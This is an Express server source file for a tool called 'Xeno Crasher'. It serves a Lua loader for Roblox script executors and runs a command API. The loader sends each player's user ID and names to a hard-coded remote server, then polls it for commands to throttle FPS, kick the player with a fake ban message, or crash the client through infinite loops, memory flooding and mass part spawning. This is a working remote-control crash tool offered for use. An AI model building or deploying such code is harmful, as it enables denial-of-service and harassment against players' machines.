const express = require('express');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

const PUBLIC_URL = process.env.PUBLIC_URL || 'https://crasherscript-production.up.railway.app';

app.use(cors({
    origin: '*',
    methods: ['GET', 'POST', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'X-Api-Key']
}));
app.use(express.json({ limit: '10mb' }));

const players = new Map();

// ============================================
// LOADER SCRIPT
// ============================================
app.get('/loader.lua', (req, res) => {
    const loader = `--[[ Xeno Crasher Client v2 ]]--
local BASE = "${PUBLIC_URL}"
local KEY  = "xenooooo"

-- ============================================
-- HTTP REQUEST DETECTION
-- ============================================
local function findHttpFunction()
    local functions = {
        syn and syn.request,
        request,
        http and http.request,
        http_request,
        fluxus and fluxus.request,
        getgenv and getgenv().request,
        getrenv and getrenv().request,
        shared and shared.request,
        function(url, options)
            return game:GetService("HttpService"):PostAsync(
                url,
                options.Body or "",
                Enum.HttpContentType.ApplicationJson
            )
        end
    }
    
    for _, func in ipairs(functions) do
        if type(func) == "function" then
            return func
        end
    end
    return nil
end

local request = findHttpFunction()
if not request then
    error("❌ No HTTP function found!")
end

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local LP = Players.LocalPlayer

if not LP then
    local deadline = tick() + 30
    repeat task.wait(0.1) LP = Players.LocalPlayer until LP or tick() > deadline
end
if not LP then return end

local function safe(fn)
    local ok, res = pcall(fn)
    if ok then return res end
    return nil
end

-- ============================================
-- GUI
-- ============================================
local function createGUI()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "XenoCrasherGUI"
    screenGui.ResetOnSpawn = false
    screenGui.Parent = LP:WaitForChild("PlayerGui")
    
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 220, 0, 50)
    frame.Position = UDim2.new(0.5, -110, 0.9, 0)
    frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    frame.BackgroundTransparency = 0.4
    frame.BorderSizePixel = 2
    frame.BorderColor3 = Color3.fromRGB(100, 255, 100)
    frame.Parent = screenGui
    
    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, 0, 1, 0)
    label.Text = "✅ Connected to Xeno Crasher"
    label.TextColor3 = Color3.fromRGB(100, 255, 100)
    label.BackgroundTransparency = 1
    label.Font = Enum.Font.SourceSansBold
    label.TextSize = 14
    label.Parent = frame
    
    return screenGui
end

createGUI()

-- ============================================
-- HEARTBEAT
-- ============================================
local function heartbeat()
    safe(function()
        pcall(function()
            return request({
                Url = BASE .. "/api/public/heartbeat",
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json", ["X-Api-Key"] = KEY },
                Body = HttpService:JSONEncode({
                    user_id = LP.UserId,
                    username = LP.Name,
                    display_name = LP.DisplayName,
                    executor = "XenoClient",
                    online = true
                }),
            })
        end)
    end)
end

-- ============================================
-- FPS LIMIT
-- ============================================
local fpsConnection = nil
local fpsActive = false

local function setFPSLimit(targetFPS)
    print("🎯 Setting FPS to: " .. tostring(targetFPS))
    
    if fpsConnection then
        fpsConnection:Disconnect()
        fpsConnection = nil
        fpsActive = false
    end
    
    if not targetFPS or targetFPS <= 0 then
        print("✅ FPS limit disabled")
        return
    end
    
    fpsActive = true
    local frameTime = 1 / targetFPS
    
    fpsConnection = RunService.RenderStepped:Connect(function()
        local startTime = tick()
        while tick() - startTime < frameTime and fpsActive do
            -- Busy loop to cap FPS
        end
    end)
end

-- ============================================
-- POLL - RECEIVES COMMANDS
-- ============================================
local function poll()
    safe(function()
        local success, result = pcall(function()
            return request({
                Url = BASE .. "/api/public/command?user_id=" .. LP.UserId,
                Method = "GET",
                Headers = { ["X-Api-Key"] = KEY },
            })
        end)
        
        if success and result and result.Body then
            local data = HttpService:JSONDecode(result.Body)
            print("📥 Received: " .. HttpService:JSONEncode(data))
            
            -- FPS LIMIT
            if data.fps_limit then
                local targetFPS = tonumber(data.fps_limit)
                if targetFPS and targetFPS > 0 then
                    setFPSLimit(targetFPS)
                else
                    setFPSLimit(nil)
                end
            end
            
            -- CRASH
            if data.crash == true then
                print("💥 CRASH COMMAND RECEIVED!")
                
                -- Method 1: Infinite loop
                task.spawn(function()
                    while true do
                        local x = 0
                        for i = 1, 1000000 do
                            x = x + i
                        end
                    end
                end)
                
                -- Method 2: Memory flood
                task.spawn(function()
                    local t = {}
                    while true do
                        for i = 1, 1000 do
                            t[#t + 1] = string.rep("X", 50000)
                        end
                        task.wait()
                    end
                end)
                
                -- Method 3: Part spam
                task.spawn(function()
                    for i = 1, 5000 do
                        local p = Instance.new("Part")
                        p.Size = Vector3.new(100, 100, 100)
                        p.Parent = workspace
                        p.Position = Vector3.new(
                            math.random(-1000, 1000),
                            math.random(-1000, 1000),
                            math.random(-1000, 1000)
                        )
                        task.wait(0.01)
                    end
                end)
            end
            
            -- KICK
            if data.kick == true then
                print("👢 KICK COMMAND RECEIVED!")
                task.wait(0.5)
                LP:Kick("You have been banned.")
            end
        end
    end)
end

-- ============================================
-- START
-- ============================================
heartbeat()
poll()

task.spawn(function()
    while task.wait(3) do heartbeat() end
end)

task.spawn(function()
    while task.wait(0.5) do poll() end
end)

print("✅ Xeno Crasher loaded successfully!")
print("🔗 Connected to: " .. BASE)
print("👤 Player: " .. LP.Name)
`;

    res.setHeader('Content-Type', 'text/plain');
    res.send(loader);
});

// ============================================
// API ENDPOINTS
// ============================================

app.post('/api/public/heartbeat', (req, res) => {
    const data = req.body;
    if (!data || !data.user_id) {
        return res.status(400).json({ error: 'Missing user_id' });
    }
    const userId = String(data.user_id);
    
    const existing = players.get(userId) || {};
    players.set(userId, {
        ...existing,
        ...data,
        user_id: userId,
        online: true,
        lastHeartbeat: Date.now()
    });
    
    console.log(`❤️ Heartbeat from: ${data.username || userId}`);
    res.json({ status: 'ok' });
});

app.get('/api/players', (req, res) => {
    const list = [];
    const now = Date.now();
    const OFFLINE_THRESHOLD = 15000;

    for (const [id, p] of players.entries()) {
        const timeSinceLast = now - (p.lastHeartbeat || 0);
        const online = timeSinceLast < OFFLINE_THRESHOLD;
        
        p.online = online;
        list.push({ ...p });
        players.set(id, p);
    }
    
    res.json({ players: list });
});

app.post('/api/command', (req, res) => {
    const { user_id, fps_limit, kick, crash } = req.body;
    if (!user_id) return res.status(400).json({ error: 'Missing user_id' });
    const userId = String(user_id);
    const p = players.get(userId);
    if (!p) return res.status(404).json({ error: 'Player not found' });
    
    if (fps_limit !== undefined) {
        p.fps_limit = parseInt(fps_limit) || false;
        console.log(`🎯 FPS set to ${p.fps_limit} for: ${p.username || userId}`);
    }
    if (kick === true) {
        p._kick = true;
        console.log(`👢 KICK SENT TO: ${p.username || userId}`);
    }
    if (crash === true) {
        p._crash = true;
        console.log(`💥 CRASH SENT TO: ${p.username || userId}`);
    }
    
    players.set(userId, p);
    res.json({ status: 'ok' });
});

app.get('/api/public/command', (req, res) => {
    const userId = req.query.user_id;
    if (!userId) return res.status(400).json({ error: 'Missing user_id' });
    const p = players.get(String(userId));
    if (!p) return res.json({});
    
    const response = {};
    
    if (p.fps_limit) {
        response.fps_limit = p.fps_limit;
        p.fps_limit = false;
    }
    if (p._crash) {
        response.crash = true;
        p._crash = false;
    }
    if (p._kick) {
        response.kick = true;
        p._kick = false;
    }
    
    players.set(String(userId), p);
    res.json(response);
});

// ============================================
// SERVE FRONTEND
// ============================================
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// ============================================
// START SERVER
// ============================================
app.listen(PORT, () => {
    console.log(`🚀 Xeno Crasher Server running on port ${PORT}`);
    console.log(`📍 Public URL: ${PUBLIC_URL}`);
});
